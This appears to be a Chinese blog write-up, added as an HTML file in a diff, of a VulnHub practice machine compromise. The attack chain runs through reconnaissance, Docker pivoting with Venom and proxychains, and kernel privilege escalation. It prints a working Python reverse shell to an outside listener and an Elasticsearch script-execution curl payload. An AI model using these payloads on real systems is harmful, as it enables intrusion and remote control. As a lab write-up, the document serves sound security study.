@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href="//cdn.staticfile.org/Primer/21.0.7/primer.css" rel="stylesheet" />
+    <link rel="icon" href="https://cos.kevinc.ltd/file/download?fileId=1419">
+    <script>
+        if(localStorage.getItem("meek_theme")==null){}
+        else if(localStorage.getItem("meek_theme")=="dark"){document.getElementsByTagName("html")[0].attributes.getNamedItem("data-color-mode").value="dark";}
+        else if(localStorage.getItem("meek_theme")=="light"){document.getElementsByTagName("html")[0].attributes.getNamedItem("data-color-mode").value="light";}
+    </script>
+    
+<title>靶场练习1：Medium_Socialnetwork</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<span class="postTitle">靶场练习1：Medium_Socialnetwork</span>
+<div class="title-right">
+
+    <a href="/"><button id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd" d="M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z"></path>
+        </svg>
+    </button></a>
+
+    <a href="https://github.com/cha0s32/cha0s32.github.io/issues/4" target="_blank"><button class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd" d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"></path>
+        </svg>
+    </button></a>
+
+    <button class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </button>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody">
+<h1>靶机链接</h1>
+<p><a href="https://www.vulnhub.com/entry/boredhackerblog-social-network,454/" rel="nofollow">https://www.vulnhub.com/entry/boredhackerblog-social-network,454/</a></p>
+<h1>信息收集阶段</h1>
+<p>进行主机的发现，由于已知主机跟Kali在同一网段下 ,所以使用 arp-scan 工具扫描</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/8a5b7212df2a12ad858cca1c0dbd7f3140659fb61addfca25f464e231576ed71/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d353932"><img src="https://camo.githubusercontent.com/8a5b7212df2a12ad858cca1c0dbd7f3140659fb61addfca25f464e231576ed71/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d353932" alt="" data-canonical-src="https://cos.kevinc.ltd/file/download?fileId=592" style="max-width: 100%;"></a></p>
+<p>主机发现阶段发现同一网段下有三个资产，第一个大概率是网关，第二个经验证是物理机的地址，猜测第三个地址为靶机地址，接下来要对靶机进行端口的扫描，以发现靶机上跑了什么服务</p>
+<p>使用nmap进行端口扫描，第一步是对目标进行端口的发现</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/d43d3e281789bb813febf5bc595e3bd616c96b19470308c6f33ead5a5cebcd92/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d353933"><img src="https://camo.githubusercontent.com/d43d3e281789bb813febf5bc595e3bd616c96b19470308c6f33ead5a5cebcd92/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d353933" alt="" data-canonical-src="https://cos.kevinc.ltd/file/download?fileId=593" style="max-width: 100%;"></a></p>
+<p>发现靶机上开了两个端口，其中一个是22端口（SSH服务），另一个是非常见端口5000。针对SSH服务常见的攻击手法是弱口令、暴破或者利用一些历史版本漏洞进行突破，目前收集的信息尚少。可以对端口进行版本的发现，看看各个端口上跑的是什么服务。</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/a7ee5d485394413459041c471b806c730308b55a4e11d3ce2f62838d0a6abcac/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d353935"><img src="https://camo.githubusercontent.com/a7ee5d485394413459041c471b806c730308b55a4e11d3ce2f62838d0a6abcac/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d353935" alt="" data-canonical-src="https://cos.kevinc.ltd/file/download?fileId=595" style="max-width: 100%;"></a></p>
+<p>通过版本发现可以得到的信息是：系统为Ubuntu，22端口上跑的是SSH服务，5000端口上跑的是http服务，其中的Werkzeug是一个WSGI的工具包，也可以作为Web框架的底层库，基于Python2来实现。使用searchsploit 寻找关于 Werkzeug 的漏洞，可以找到两三个，均利用不成功。</p>
+<p>整理一下目前得到的可用信息：其中SSH可以考虑暴破用户名密码，5000端口上跑了一个网站，可以访问寻找突破口，其中的框架是基于Python来实现的，若有代码执行，可以考虑用Python脚本来执行反弹shell。</p>
+<h1>通过Web漏洞拿shell</h1>
+<p>尝试访问目标的5000端口，发现是一个交互网站</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/bdcedbc7d3dfd4292af3501f919fcd09722d3ff391bce54508fae1cfeac2b7c4/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d353936"><img src="https://camo.githubusercontent.com/bdcedbc7d3dfd4292af3501f919fcd09722d3ff391bce54508fae1cfeac2b7c4/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d353936" alt="" data-canonical-src="https://cos.kevinc.ltd/file/download?fileId=596" style="max-width: 100%;"></a></p>
+<p>网站有输入框，但是信息提示 ”绝对安全“， 突破可能性不大。但还是尝试插入了一下XSS payload</p>
+<div class="highlight highlight-text-html-basic"><pre class="notranslate"><span class="pl-kos">&lt;</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span><span class="pl-en">alert</span><span class="pl-kos">(</span><span class="pl-s">'justtry'</span><span class="pl-kos">)</span><span class="pl-kos">&lt;/</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span></pre></div>
+<p>发现还是原样输出到页面，证明该输入框不是突破点，通过查看源代码也找不到什么其他信息。</p>
+<p>尝试收集更多的信息，在网站下进行目录扫描，看有没有管理后台或者敏感信息泄露，这里使用的是dirsearch工具</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/017f93539577136b8c6892bf8f773b4bdcc075530a9b1f419ad1efed3032cb0d/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d353937"><img src="https://camo.githubusercontent.com/017f93539577136b8c6892bf8f773b4bdcc075530a9b1f419ad1efed3032cb0d/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d353937" alt="" data-canonical-src="https://cos.kevinc.ltd/file/download?fileId=597" style="max-width: 100%;"></a></p>
+<p>发现 有一个 /admin 路径，尝试访问，页面有代码测试功能，可尝试代码执行。考虑到框架是基于Python 实现的，可以找 Python 的 反弹shell 代码。</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/41ca1cbcb28989af4d6d0d02e4e0ffd458edfc9c71c01cf043929add75fe375b/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d353938"><img src="https://camo.githubusercontent.com/41ca1cbcb28989af4d6d0d02e4e0ffd458edfc9c71c01cf043929add75fe375b/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d353938" alt="" data-canonical-src="https://cos.kevinc.ltd/file/download?fileId=598" style="max-width: 100%;"></a></p>
+<p>在CSDN上找到一段现成的可以直接拿来用的代码</p>
+<div class="highlight highlight-text-html-basic"><pre class="notranslate">import socket,subprocess,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("192.168.43.173",4444));
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+p=subprocess.call(["/bin/bash","-i"]);</pre></div>
+<p>执行前 Kali 应该先监听自身的 4444 端口， 然后执行代码，成功回弹！！！</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/6c340aab2016e7796ea2f865b7cfe5dc8b798f57e2b2821c81de7fed03a6c23a/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d353939"><img src="https://camo.githubusercontent.com/6c340aab2016e7796ea2f865b7cfe5dc8b798f57e2b2821c81de7fed03a6c23a/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d353939" alt="" data-canonical-src="https://cos.kevinc.ltd/file/download?fileId=599" style="max-width: 100%;"></a></p>
+<p>在这里其实还遇到一个小问题，就是当 shell 是 /bin/bash 的时候，回弹的时候没有回显，于是尝试换成 sh ， 回弹就有回显了，我也不知道为什么。</p>
+<p>拿下 shell 后 先看看自己的权限， 发现是 root， 就这？</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/24320921d2e62baa9e5381df330ef157e41c20001c2aaf789c24a4ec81d87711/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d363030"><img src="https://camo.githubusercontent.com/24320921d2e62baa9e5381df330ef157e41c20001c2aaf789c24a4ec81d87711/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d363030" alt="" data-canonical-src="https://cos.kevinc.ltd/file/download?fileId=600" style="max-width: 100%;"></a></p>
+<p>然后去看系统中存在什么文件，发现很不对劲，文件中存在Dockerfile文件，Dockerfile 是 docker 部署的一个模板文件。 初步断定闹了半天拿下的是一个docker 容器的 shell。</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/2746e2a6cb630f372de1d1b03b31089e2a1398ee44a33fb6b7d6ebec7b4aebf2/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d363031"><img src="https://camo.githubusercontent.com/2746e2a6cb630f372de1d1b03b31089e2a1398ee44a33fb6b7d6ebec7b4aebf2/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d363031" alt="" data-canonical-src="https://cos.kevinc.ltd/file/download?fileId=601" style="max-width: 100%;"></a></p>
+<p>可以尝试使用以下两个命令来查证是否docker 容器</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">ls /.dockerenv
+<span class="pl-c"><span class="pl-c">#</span> 根目录下若存在dockerenv， 基本上可断定为docker容器</span>
+cat /proc/1/cgroup
+<span class="pl-c"><span class="pl-c">#</span> pid为1是初始化进程，若初始化进程中包含了docker映像的信息，可确认为docker容器</span></pre></div>
+<p>确认为 docker 容器后，下一步是如何从 docker容器中 突破出来，最终拿到服务器的 权限。</p>
+<h1>内网穿透</h1>
+<p>确认容器地址， 为 172 开头的地址</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/29fad988c1a78e3b849638a18b994cb212078ba7c5b2f69363eedb98e19fe11f/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d363032"><img src="https://camo.githubusercontent.com/29fad988c1a78e3b849638a18b994cb212078ba7c5b2f69363eedb98e19fe11f/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d363032" alt="" data-canonical-src="https://cos.kevinc.ltd/file/download?fileId=602" style="max-width: 100%;"></a></p>
+<p>可以将容器地址看作内网地址，可以在内网中进行主机发现，看看是否还存在其他容器。</p>
+<p>最简单进行主机发现的方法是一个个 IP 地址 去 ping， 但手工操作其实很麻烦，尝试用shell脚本完成操作</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/3e1c69afceac5392934fcbcbfaacbdb8edee13e29981dc9442bc7c2bc6ec808e/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d363033"><img src="https://camo.githubusercontent.com/3e1c69afceac5392934fcbcbfaacbdb8edee13e29981dc9442bc7c2bc6ec808e/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d363033" alt="" data-canonical-src="https://cos.kevinc.ltd/file/download?fileId=603" style="max-width: 100%;"></a></p>
+<p>可以发现 很快就有三个 IP 回包了， 接下来的都没有回包， 初步收集到 内网网段 三个地址。</p>
+<p>已知 172.17.0.2 为容器地址，想要用Kali对另外两个地址进行信息收集，必须进行内网穿透，把Kali 到内网的路由 打通， 这里 用到 内网穿透工具 Venom。</p>
+<p>首先在 Kali 上运行服务端程序 启动侦听</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/a974b3d7e4f22e814226b14cc97eb1120150e04dd88d3ffc62e2d9c4093139fb/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d363034"><img src="https://camo.githubusercontent.com/a974b3d7e4f22e814226b14cc97eb1120150e04dd88d3ffc62e2d9c4093139fb/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d363034" alt="" data-canonical-src="https://cos.kevinc.ltd/file/download?fileId=604" style="max-width: 100%;"></a></p>
+<p>为了让 目标靶机 能 获取到Venom客户端程序，在 Kali 目录下 开启 http 服务， 然后在目标靶机上使用 wget 来获取</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/b2e4dc0224244a80e04e5bd517fe65fe900a80870811c9df8ce0dc9091d72fc0/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d363035"><img src="https://camo.githubusercontent.com/b2e4dc0224244a80e04e5bd517fe65fe900a80870811c9df8ce0dc9091d72fc0/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d363035" alt="" data-canonical-src="https://cos.kevinc.ltd/file/download?fileId=605" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/478b8f55cc062214301ee9e4e221ff5e2a8d993f0f85adb4db826dea68d1b7ff/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d363036"><img src="https://camo.githubusercontent.com/478b8f55cc062214301ee9e4e221ff5e2a8d993f0f85adb4db826dea68d1b7ff/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d363036" alt="" data-canonical-src="https://cos.kevinc.ltd/file/download?fileId=606" style="max-width: 100%;"></a></p>
+<p>获取客户端程序后，赋予程序可执行权限。用客户端连接远程 Kali 机器</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/369f2aefc220da9bbf3137e2097e7afa05939ff28d31a2e4756897e77b0cbfa9/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d363037"><img src="https://camo.githubusercontent.com/369f2aefc220da9bbf3137e2097e7afa05939ff28d31a2e4756897e77b0cbfa9/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d363037" alt="" data-canonical-src="https://cos.kevinc.ltd/file/download?fileId=607" style="max-width: 100%;"></a></p>
+<p>可以看到程序成功执行， 跟服务端的连接也建立起来了。在服务器端，通过 show 命令 可以看到已经有一个节点 连接上来了，可以 goto 到 此节点</p>
+<p>并启用一个监听1080 端口的 socks 代理，Kali 的 所有工具 可以通过 proxychains 这个工具 挂上这个代理去访问 容器内网的整个网段</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/b09b1e2ebce36b2cd8b5bb01599c499016e382d1be03824f3cd619d15f0fc043/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d363038"><img src="https://camo.githubusercontent.com/b09b1e2ebce36b2cd8b5bb01599c499016e382d1be03824f3cd619d15f0fc043/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d363038" alt="" data-canonical-src="https://cos.kevinc.ltd/file/download?fileId=608" style="max-width: 100%;"></a></p>
+<p>修改proxychains 配置文件，把代理类型改成 socks5， 代理端口 改成 1080</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/27faf3b305652957c8f86c7e3483c73868dd40b5f66d2ae0df0f4c39ea8f1208/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d363039"><img src="https://camo.githubusercontent.com/27faf3b305652957c8f86c7e3483c73868dd40b5f66d2ae0df0f4c39ea8f1208/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d363039" alt="" data-canonical-src="https://cos.kevinc.ltd/file/download?fileId=609" style="max-width: 100%;"></a></p>
+<p>挂载好后，以 proxychains 为前缀，就可以对内网的主机 进行端口扫描了</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">proxychains nmap -sT -Pn 172.17.0.1
+<span class="pl-c"><span class="pl-c">#</span> -Pn  代表不进行主机发现， 直接对目标进行深层次的扫描</span>
+<span class="pl-c"><span class="pl-c">#</span> -sT 进行TCP扫描</span></pre></div>
+<p>扫描得出 172.17.0.1 开放的端口 跟 目标靶机 开放的端口一样， 都是22 和 5000浏览器挂代理后对172.17.0.1的5000端口进行访问</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/570930d577773abf2bd45217224a0c02f2950c49cb5c6048ec38db5baa29ae15/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d363130"><img src="https://camo.githubusercontent.com/570930d577773abf2bd45217224a0c02f2950c49cb5c6048ec38db5baa29ae15/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d363130" alt="" data-canonical-src="https://cos.kevinc.ltd/file/download?fileId=610" style="max-width: 100%;"></a></p>
+<p>继续对服务版本进行探测，发现 跟 目标靶机的 服务版本也完全一模一样。浏览器挂载代理后，访问172.17.0.1的5000端口，发现页面 也跟我们直接访问靶机地址的一模一样，可以确定172.17.0.1就是目标靶机，只不过该地址是靶机面向容器内网的地址。</p>
+<p>继续对172.17.0.3 进行端口扫描， 发现开了9200 端口， 对服务进行探测后发现是Elasticsearch</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/1495fb267ff7dea05d1800d869c8f6057fff3453237c199b8e89bf9e13438a06/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d363131"><img src="https://camo.githubusercontent.com/1495fb267ff7dea05d1800d869c8f6057fff3453237c199b8e89bf9e13438a06/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d363131" alt="" data-canonical-src="https://cos.kevinc.ltd/file/download?fileId=611" style="max-width: 100%;"></a></p>
+<p>针对服务搜寻漏洞</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">searchsploit Elasticsearch</pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/9229dd2241d4ddfe220fe036311d9b58bb159b2c9c53859cf195a977be7a60dd/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d363132"><img src="https://camo.githubusercontent.com/9229dd2241d4ddfe220fe036311d9b58bb159b2c9c53859cf195a977be7a60dd/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d363132" alt="" data-canonical-src="https://cos.kevinc.ltd/file/download?fileId=612" style="max-width: 100%;"></a></p>
+<p>发现有RCE可做利用，将漏洞利用代码拷贝到当前目录下，简单看一下脚本的执行例子。</p>
+<p>可先尝试一下执行脚本，一般脚本在注释或者报错提示里都有脚本执行的格式，按照格式一步一步来</p>
+<p>第一次利用脚本36337.py的时候会报错，原因是elasticsearch服务里面没有数据，所以不能通过elasticsearch来搜索进而执行命令。</p>
+<p>解决方法是先插入一条数据，再进行脚本的利用。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">proxychains curl -XPOST <span class="pl-s"><span class="pl-pds">'</span>http://172.17.0.3:9200/twitter/user/yren<span class="pl-pds">'</span></span> -d <span class="pl-s"><span class="pl-pds">'</span>{ "name" : "Wu" }<span class="pl-pds">'</span></span></pre></div>
+<div class="highlight highlight-source-shell"><pre class="notranslate">proxychains curl -XPOST <span class="pl-s"><span class="pl-pds">'</span>http://172.17.0.3:9200/_search?pretty<span class="pl-pds">'</span></span> -d <span class="pl-s"><span class="pl-pds">'</span>{"script_fields": {"payload": {"script": "java.lang.Math.class.forName("java.lang.Runtime").getRuntime().exec("whoami").getText()"}}}<span class="pl-pds">'</span></span></pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/f8912ec6e6e5bbc3c080959cdaa867ff93a80ed21369800d0ddb0a1137590eda/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d363133"><img src="https://camo.githubusercontent.com/f8912ec6e6e5bbc3c080959cdaa867ff93a80ed21369800d0ddb0a1137590eda/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d363133" alt="" data-canonical-src="https://cos.kevinc.ltd/file/download?fileId=613" style="max-width: 100%;"></a></p>
+<p>成功拿到第二台容器的shell，查看权限，发现也是 root （没什么卵用）</p>
+<p>在目录中发现一个敏感文件 passwords， 有可能是密码文件</p>
+<p>查看文件，发现密码做了哈希， 去 somd5 尝试破解</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/b064e39a1f0ab21ea7d0a0a0a6e16cc32007c6e3940ac48da705d8f1823c586f/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d363134"><img src="https://camo.githubusercontent.com/b064e39a1f0ab21ea7d0a0a0a6e16cc32007c6e3940ac48da705d8f1823c586f/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d363134" alt="" data-canonical-src="https://cos.kevinc.ltd/file/download?fileId=614" style="max-width: 100%;"></a></p>
+<p>解密完密码后，可尝试使用账号密码去登录目标靶机的SSH</p>
+<p>发现 John 用户 可直接登录到 目标靶机的 22 端口， 尝试用 sudo -s 提权，发现 John 并不能直接提升为 root 权限</p>
+<h1>利用内核漏洞提权</h1>
+<p>此时需要考虑使用系统内核漏洞去提权</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/92dedc5adb53b5545c53c4e3060fe7bc31b6a7c5efcb1721ccc026de512b4711/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d363135"><img src="https://camo.githubusercontent.com/92dedc5adb53b5545c53c4e3060fe7bc31b6a7c5efcb1721ccc026de512b4711/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d363135" alt="" data-canonical-src="https://cos.kevinc.ltd/file/download?fileId=615" style="max-width: 100%;"></a></p>
+<p>使用 searchsploit 搜索 LInux 3.13 相关的漏洞利用代码， 选用 37292.c 这个 exp，但这个 exp 有个问题。首先目标靶机上是没有装 gcc 的， 也就是说 所有的c语言代码只能在 Kali 机器上进行编译。在查看 EXP 的过程中， 发现有一段代码编译了一个c文件成so文件，再对这个so文件进行调用 —— 意味着就算在 Kali 上对 EXP 进行了编译，放到目标靶机上仍无法执行成功。</p>
+<p>解决的思路是：修改EXP 代码， 将编译相关的代码段去掉， 然后直接找到编译好的so文件进行调用。</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/46c5ebba8a1eb9339fea2eb836ddbb8a8fe46d955420e1250dd0efb521250f87/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d363136"><img src="https://camo.githubusercontent.com/46c5ebba8a1eb9339fea2eb836ddbb8a8fe46d955420e1250dd0efb521250f87/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d363136" alt="" data-canonical-src="https://cos.kevinc.ltd/file/download?fileId=616" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/7591bce0370221046d2ce8783cf452c402c9d9f928b9785989606ea969735494/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d363137"><img src="https://camo.githubusercontent.com/7591bce0370221046d2ce8783cf452c402c9d9f928b9785989606ea969735494/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d363137" alt="" data-canonical-src="https://cos.kevinc.ltd/file/download?fileId=617" style="max-width: 100%;"></a></p>
+<p>同样是在 Kali 上启用 http 服务，然后在目标主机上获取到需要的文件</p>
+<p>为了执行的方便，在获取到 exp 和 so 文件后，将文件移动到 /tmp 目录去执行</p>
+<p>先给 exp 赋予可执行权限 ，然后执行。 在执行的过程中，exp 会去调用 目录下的 so文件进行提权，执行结束后 使用 id 命令查看权限， 已经 拿到了目标 靶机的 root 权限了</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/5d6a2813cf5b660d0375b8855a26a4e1b9b7cb77ffc91c62b01e2d5a1565ee24/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d363138"><img src="https://camo.githubusercontent.com/5d6a2813cf5b660d0375b8855a26a4e1b9b7cb77ffc91c62b01e2d5a1565ee24/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d363138" alt="" data-canonical-src="https://cos.kevinc.ltd/file/download?fileId=618" style="max-width: 100%;"></a></p>
+<h1>思路总结</h1>
+<p>面对靶机，首先是进行主机发现。</p>
+<p>针对发现的主机，要进行端口扫描和端口服务的发现。</p>
+<p>若服务中有Web应用，尝试在 Web 应用中找突破点，在该靶机中，我们遇到了一个代码执行，并通过Python脚本成功获得了一个反弹shell，但通过对系统文件的搜寻发现被困在一个容器系统中。</p>
+<p>使用 ICMP 对容器系统中的资产进行发现，发现了另外两个地址。</p>
+<p>为了使用 Kali 的工具对内网 的容器系统进行渗透，利用Venom工具建立了从Kali 到容器内网的隧道，并在 Kali 上开启了 监听1080端口 的代理。通过proxychains 挂载这个代理在Kali 上访问内网。</p>
+<p>发现其中一个资产开启了9200端口，判断为 Elasticsearch 服务，通过对其漏洞的利用拿下第二个docker容器的shell，并在该容器中发现了密码文件。</p>
+<p>利用密码文件破译出的账号密码尝试登录目标系统的SSH并成功登录，却发现自己只是一个普通用户。</p>
+<p>考虑到内核版本比较老，尝试通过内核漏洞进行提权。</p>
+<p>由于EXP中调用了gcc进行C文件的编译，所以把关于编译的代码全部删掉，直接找到编译好的so文件进行直接调用。</p>
